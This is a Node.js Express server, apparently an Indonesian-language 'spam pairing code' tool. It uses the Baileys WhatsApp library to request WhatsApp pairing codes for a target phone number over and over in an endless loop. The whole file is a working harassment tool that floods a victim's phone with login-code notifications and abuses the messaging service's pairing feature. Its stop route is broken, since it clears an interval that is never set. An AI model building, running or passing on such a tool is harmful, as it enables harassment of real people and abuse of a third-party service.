const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const chalk = require('chalk');
const FileType = require('file-type');
const path = require('path');
const axios = require('axios');
const _ = require('lodash');
const moment = require('moment-timezone');
const PhoneNumber = require('awesome-phonenumber');
const {
  default: spamConnect,
  delay,
  PHONENUMBER_MCC,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  jidDecode,
  proto,
  Browsers
} = require('@whiskeysockets/baileys');
const NodeCache = require('node-cache');
const readline = require('readline');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

const store = makeInMemoryStore({
  logger: pino().child({
    level: 'silent',
    stream: 'store'
  })
});

let spam;
let interval;

app.use(express.static('public'));
app.use(express.json());

app.post('/start', async (req, res) => {
  const { phoneNumber } = req.body;
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Nomor telepon tidak diberikan' });
  }

  try {
    const { version, isLatest } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState('./targetsessi');
    const msgRetryCounterCache = new NodeCache();

    spam = spamConnect({
      logger: pino({
        level: 'silent'
      }),
      printQRInTerminal: false,
      browser: Browsers.windows('Firefox'),
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, pino({
          level: 'fatal'
        }).child({
          level: 'fatal'
        }))
      },
      markOnlineOnConnect: true,
      generateHighQualityLinkPreview: true,
      getMessage: async key => {
        if (store) {
          const msg = await store.loadMessage(key.remoteJid, key.id);
          return msg.message || undefined;
        }
        return {
          conversation: 'SPAM PAIRING CODE'
        };
      },
      msgRetryCounterCache: msgRetryCounterCache,
      defaultQueryTimeoutMs: undefined
    });
    store.bind(spam.ev);

    if (!spam.authState.creds.registered) {
      while (true) {
        let second = 100;
        while (second > 0) {
          let code = await spam.requestPairingCode(phoneNumber);
          code = code?.match(/.{1,4}/g)?.join('-') || code;
          console.log(chalk.bgBlack(chalk.greenBright('Pairing Code: ' + code)));
          console.log(chalk.bgBlack(chalk.whiteBright('Spam Berjalan Selama: ' + second + ' detik...')));
          await new Promise(resolve => setTimeout(resolve, 1000));
          second--;
        }
        console.log(chalk.bgBlack(chalk.redBright('Mengirim Ulang Dalam 30 detik...')));
        await new Promise(resolve => setTimeout(resolve, 30000));
      }
    }

    res.status(200).json({ message: 'Spam started' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/stop', (req, res) => {
  if (interval) {
    clearInterval(interval);
    interval = null;
    res.status(200).json({ message: 'Spam stopped' });
  } else {
    res.status(400).json({ error: 'Spam not running' });
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
